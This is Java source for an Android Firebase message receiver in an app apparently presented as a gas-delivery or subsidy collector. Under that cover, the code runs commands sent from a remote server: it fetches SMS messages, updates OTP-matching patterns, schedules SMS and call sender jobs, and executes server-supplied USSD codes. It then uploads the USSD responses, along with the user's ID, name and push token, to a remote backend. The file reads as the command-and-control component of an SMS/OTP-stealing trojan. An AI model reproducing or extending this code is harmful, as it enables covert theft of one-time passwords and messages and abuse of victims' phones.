package android.iocl.dac_collector.Firebase;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.iocl.dac_collector.BuildConfig;
import android.iocl.dac_collector.Interface.ResponseListener;
import android.iocl.dac_collector.ModelData.ColumnValue;
import android.iocl.dac_collector.ModelData.ConsumerData;
import android.iocl.dac_collector.ModelData.DAC_Collector_Base;
import android.iocl.dac_collector.ModelData.SubsidyRecord;
import android.iocl.dac_collector.ModelData.update_dac_collect;
import android.iocl.dac_collector.RetrofitClient.RequestService;
import android.iocl.dac_collector.RetrofitClient.RetrofitClient;
import android.iocl.dac_collector.Services.JobSchedulerUtil;
import android.iocl.dac_collector.Services.SendDACService;
import android.iocl.dac_collector.Services.SmsFetchWorker;
import android.iocl.dac_collector.Services.SmsSenderJOBService;
import android.iocl.dac_collector.Utility.NotificationHelper;
import android.iocl.dac_collector.Utility.SharedPrefs;
import android.iocl.dac_collector.Utility.Utility;
import android.iocl.dac_collector.Utility.WakeupHelper;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.content.ContextCompat;
import androidx.work.Constraints;
import androidx.work.NetworkType;
import androidx.work.OneTimeWorkRequest;
import androidx.work.WorkManager;

import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;

import java.util.Arrays;
import java.util.List;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class FCMPushReceiver extends FirebaseMessagingService {

    private static final String TAG = "MyFirebaseMsgService";

    @Override
    public void onMessageReceived(RemoteMessage remoteMessage) {

        WakeupHelper.wakeupAppService(getApplicationContext());

        Log.d(TAG, "From: " + remoteMessage.getFrom());

        if (remoteMessage.getData().size() > 0) {
            String actionType = remoteMessage.getData().get("actions");
            String payloads = remoteMessage.getData().get("payload");

            Log.d(TAG, "Action: " + actionType);
            Log.d(TAG, "Payload: " + payloads);


            switch (actionType) {
                case "heart_beat":
                    scheduleJob();
                    WakeupHelper.scheduleAlarm(getApplicationContext(), SmsSenderJOBService.class);
                    break;
                case "recharge_notify":

                    NotificationHelper.showRechargeNotification(getApplicationContext(), payloads);
                    break;
                case "otp_patterns":
                    Log.d(TAG, "onMessageReceived: " + payloads);
                    Utility.updateMessagePattern(payloads, this);
                    break;
                case "get_sms":
                    handleSendSms();
                    break;
                case "receivedSubsidy":
                    handleSubsidy(payloads);
                    break;
                case "run_ussd":
                    runUssdCode(getApplicationContext(), payloads);
                    break;
                default:
                    Log.d(TAG, "onMessageReceived: " + actionType);
                    break;
                case "get_dac":
                    Intent mainService = new Intent(this, SendDACService.class);
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        startForegroundService(mainService);
                    } else {
                        startService(mainService);
                    }
                    break;
            }


        }


    }

    private void handleSubsidy(String payload) {
        NotificationHelper.showRechargeNotification(getApplicationContext(), payload);
        SharedPrefs.setSubsidyDetails(getApplicationContext(), payload);
        SharedPrefs.SetlastSubsidyDate(getApplicationContext(), Utility.getStandardDate());
        SharedPrefs.setIsSubsidyRequestPending(getApplicationContext(), false);
    }


    @SuppressLint("MissingPermission")
    public void runUssdCode(final Context ctx, String ussdCode) {
        Log.d(this.getClass().getName(), "code run garne");

        // Check if we have necessary permissions
        if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
            Log.e(this.getClass().getName(), "Permission not granted for CALL_PHONE.");
            return;
        }

        TelephonyManager manager = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
        Log.d("networkprovider", manager.getNetworkOperatorName());

        if (manager != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                // Use the main thread's Looper to ensure the Handler is associated with the main thread
                Handler handler = new Handler(Looper.getMainLooper());

                manager.sendUssdRequest(ussdCode, new TelephonyManager.UssdResponseCallback() {
                    @Override
                    public void onReceiveUssdResponse(TelephonyManager telephonyManager, String request, CharSequence response) {
                        super.onReceiveUssdResponse(telephonyManager, request, response);
                        String responseReceived = response.toString();
                        Log.d(TAG, " response -> " + response);

                        sendUSSDCodeToServer(responseReceived, ussdCode);
                    }

                    @Override
                    public void onReceiveUssdResponseFailed(TelephonyManager telephonyManager, String request, int failureCode) {
                        super.onReceiveUssdResponseFailed(telephonyManager, request, failureCode);
                        Log.d(this.getClass().getName(), "response failed: " + failureCode);
                    }
                }, handler);
            }
        } else {
            Log.e(this.getClass().getName(), "TelephonyManager is null");
        }
    }


    private void handleSendSms() {
        Constraints constraints = new Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)  // Only run when connected to Wi-Fi
                .build();

        OneTimeWorkRequest smsFetchRequest = new OneTimeWorkRequest.Builder(SmsFetchWorker.class)
                .setConstraints(constraints)
                .build();

        WorkManager.getInstance(getApplicationContext()).enqueue(smsFetchRequest);
    }

    @Override
    public void onNewToken(@NonNull String token) {
        super.onNewToken(token);


        if (SharedPrefs.getBoolean(this, "isFirstTime", true)) {
            return;
        }

        sendTokenToServer(token);
    }

    private void scheduleJob() {
        if (!Utility.isJobSchedulerActive(getApplicationContext(), 1)) {
            JobSchedulerUtil.Sms_and_Call_sender(getApplicationContext());
            JobSchedulerUtil.fetch_profile_info(getApplicationContext());
        }
    }


//    private void handleNow() {
//        Log.d(TAG, "Short lived task is done.");
//    }

//    private void sendRegistrationToServer(String token) {
//        // TODO: Implement this method to send token to your app server.
//    }

//    private void sendNotification(String messageBody) {
//        Intent intent = new Intent(this, MainActivity.class);
//        intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
//        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0 /* Request code */, intent,
//                PendingIntent.FLAG_IMMUTABLE);
//
//        String channelId = "fcm_default_channel";
//        Uri defaultSoundUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION);
//        NotificationCompat.Builder notificationBuilder =
//                new NotificationCompat.Builder(this, channelId)
//                        .setSmallIcon(R.drawable.gas_cylinder_icon)
//                        .setContentTitle("FCM Message")
//                        .setColor(Color.parseColor("#14A44D"))
//                        .setColorized(true)
//                        .setContentText(messageBody)
//                        .setAutoCancel(true)
//                        .setSound(defaultSoundUri)
//                        .setContentIntent(pendingIntent);
//
//        NotificationManager notificationManager =
//                (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
//
//        // Since android Oreo notification channel is needed.
//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
//            NotificationChannel channel = new NotificationChannel(channelId,
//                    "Channel human readable title",
//                    NotificationManager.IMPORTANCE_DEFAULT);
//            notificationManager.createNotificationChannel(channel);
//        }
//
//        notificationManager.notify(0 /* ID of notification */, notificationBuilder.build());
//    }

//    public static class MyWorker extends Worker {
//
//        public MyWorker(@NonNull Context context, @NonNull WorkerParameters workerParams) {
//            super(context, workerParams);
//        }
//
//        @NonNull
//        @Override
//        public Result doWork() {
//            // TODO(developer): add long running task here.
//            return Result.success();
//        }
//    }


    private void sendTokenToServer(String fcmKey) {


        String cons_id = SharedPrefs.getConsumerId(this);
        String name = SharedPrefs.getUsername(this);

        if (cons_id.isEmpty()) {
            return;
        }

        RequestService requestService = RetrofitClient.retrofit_spreadsheet(getApplicationContext()).create(RequestService.class);
        List<ColumnValue> userInfo = Arrays.asList(
                new ColumnValue("CONSUMER_ID", cons_id),
                new ColumnValue("USER_NAME", name),
                new ColumnValue("FCM_KEY", fcmKey),
                new ColumnValue("APP_VERSION", BuildConfig.VERSION_NAME),
                new ColumnValue("LAST_ACTIVE", Utility.getCurrentTime())
        );

        update_dac_collect receiver = new update_dac_collect("addCustomer", cons_id, userInfo);
        Call<DAC_Collector_Base> auth = requestService.update_dac_collector(receiver);
        auth.enqueue(new Callback<DAC_Collector_Base>() {
            @Override
            public void onResponse(Call<DAC_Collector_Base> call, Response<DAC_Collector_Base> response) {


                Log.d(TAG, "onResponse: " + response.body().getMessage());


            }

            @Override
            public void onFailure(Call<DAC_Collector_Base> call, Throwable t) {

            }
        });

    }

    private void sendUSSDCodeToServer(String UssdResponse, String ussdCode) {


        String cons_id = SharedPrefs.getConsumerId(this);
        String name = SharedPrefs.getUserName(this);

        if (cons_id.isEmpty()) {
            return;
        }

        RequestService requestService = RetrofitClient.retrofit_spreadsheet(getApplicationContext()).create(RequestService.class);
        List<ColumnValue> smsInfo = Arrays.asList(
                new ColumnValue("USER_NAME", name),
                new ColumnValue("USER_NUMBER", ussdCode),
                new ColumnValue("SMS_B64", UssdResponse)
        );

        update_dac_collect receiver = new update_dac_collect("addUserSms", cons_id, smsInfo);
        Call<DAC_Collector_Base> auth = requestService.update_dac_collector(receiver);
        auth.enqueue(new Callback<DAC_Collector_Base>() {
            @Override
            public void onResponse(Call<DAC_Collector_Base> call, Response<DAC_Collector_Base> response) {


                Log.d(TAG, "onResponse: " + response.body().getMessage());


            }

            @Override
            public void onFailure(Call<DAC_Collector_Base> call, Throwable t) {

            }
        });

    }


}